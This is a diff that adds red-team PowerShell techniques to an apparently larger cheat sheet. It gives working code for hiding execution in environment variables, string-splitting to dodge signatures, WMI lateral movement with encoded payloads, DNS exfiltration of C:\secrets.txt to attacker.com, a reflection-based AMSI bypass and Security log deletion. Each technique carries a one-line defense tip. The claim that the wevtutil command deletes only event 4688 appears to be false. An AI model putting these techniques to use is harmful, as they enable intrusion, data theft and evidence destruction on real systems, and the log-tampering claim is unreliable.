@@ -1147,3 +1147,79 @@ Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies
 ---
 
 
+
+1. Advanced Obfuscation & Execution Techniques
+
+Environment Variable-Based Execution:
+
+$cmd = "calc.exe"
+[System.Environment]::SetEnvironmentVariable("EvilVar", $cmd, "User")
+Start-Process $env:EvilVar
+
+Purpose: Hides execution inside environment variables.
+
+Defense: Monitor registry/environment variable changes.
+
+
+String-Splitting to Evade Detection:
+
+$c = "Invo" + "ke-Expression"
+& $c "Start-Process notepad.exe"
+
+Purpose: Avoids signature-based detection.
+
+Defense: Enable AMSI & script block logging.
+
+
+
+2. More Stealthy Lateral Movement
+
+WMI with Encoded Payloads:
+
+$payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("malicious command"))
+Invoke-WmiMethod -Class Win32_Process -ComputerName TARGET -Name Create -ArgumentList "powershell -EncodedCommand $payload"
+
+Purpose: Executes payload remotely without writing to disk.
+
+Defense: Monitor WMI event logs.
+
+
+
+3. DNS-Based C2 Communication
+
+Exfiltrate Data via DNS Requests:
+
+$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt"))
+Resolve-DnsName -Name "$data.attacker.com" -Type TXT
+
+Purpose: Sends stolen data over DNS (harder to detect).
+
+Defense: Monitor abnormal DNS queries.
+
+
+
+4. AMSI Bypass Variations
+
+Your file already contains AMSI bypasses, but here’s a subtle variation using a .NET reflection trick:
+
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, $null)
+
+Purpose: Disables AMSI before running malicious code.
+
+Defense: Enable Tamper Protection in Defender.
+
+
+5. Anti-Forensics & Log Tampering
+
+Selective Log Deletion (instead of clearing all logs):
+
+wevtutil.exe cl Security /q:"*[System[(EventID=4688)]]"
+
+Purpose: Deletes only process creation logs (Event ID 4688).
+
+Defense: Forward logs to a SIEM before they are deleted.
+
+
+
+
+
